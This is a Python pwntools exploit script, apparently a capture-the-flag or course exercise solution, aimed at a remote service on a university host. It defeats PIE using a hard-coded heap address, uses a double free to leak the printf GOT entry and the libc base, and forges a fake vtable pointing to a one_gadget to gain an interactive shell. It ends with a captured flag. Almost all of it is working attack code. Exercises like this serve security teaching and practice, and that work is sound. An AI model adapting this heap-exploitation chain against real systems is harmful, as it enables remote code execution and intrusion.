import struct 
import socket 
from pwn import *

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7004

"""
libc_base_address = 0x00007ffff7e06000
one_gadget_offset = 0x448a3 
one_gadget_address = libc_base_address + one_gadget_offset
"""

create_object = b"o"
delete_object = b"D"
use_object = b"u"
assign = b"a"
delete = b"d"
search = b"s"
create = b"c"
quit = b"q"

base = b"b"
derived1 = b"1"
derived2 = b"2"

malloc1 = 0x562659e73030 # first result of the malloc, can be used first to defeat PIE 
malloc2 = malloc1 + 32
malloc1_local = 0x55555576e030
base_local = 0x0000555555554000
malloc1_offset = malloc1_local - base_local
binary_base_address = malloc1 - malloc1_offset
print("binary base address on the remote server is: {}".format(hex(binary_base_address)))

# now the idea is to leak the GOT in order to understand where libc is places
# we can do that using the double free vulnerability
# then we can proceed exactly as object1 

# double free with objects and the malloc with normal keys
# in this way search key will give me the GOT table.

printf_got_offset = 0x0000000000205ed0
printf_got_address = binary_base_address + printf_got_offset


key1 = b"1"
key2 = b"2"
key3 = b"3"
key4 = b"4"

buf = b""
buf += create_object + key1 + base + b"63"
buf += delete_object + key1
buf += delete_object + key1 # double free 
buf += create + key2 + b"16"
buf += assign + key2 + struct.pack("Q", printf_got_address - 16) + struct.pack("Q", 0) 
buf += create + key3 + b"16"
buf += create + key4 + b"16"
buf += search + key4 

with remote(host, port) as conn:
    conn.send(buf)
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    printf = struct.unpack("Q", conn.recv(8))[0]
    printf_offset = 0x0000000000058560
    libc_base_address = printf - printf_offset
    print("Libc: {}".format(hex(libc_base_address)))

one_gadget_address = libc_base_address + 0x448a3

# now it's the same ... 
key1 = b"1"
key2 = b"2"
key3 = b"3"

buf = b""
buf += create_object + key1 + base + b"63"
buf += delete_object + key1
buf += create + key2 + b"16"
buf += assign + key2 + struct.pack("Q", malloc2) + struct.pack("Q", 1) # point to fake vtable

buf += create + key3 + b"16" # create a fake vtable
buf += assign + key3 + struct.pack("Q", one_gadget_address) + struct.pack("Q", 1)

buf += use_object + key1

with remote(host, port) as conn:
    conn.send(buf)
    conn.interactive()

#NSH{one_giant_leap_for_mankind}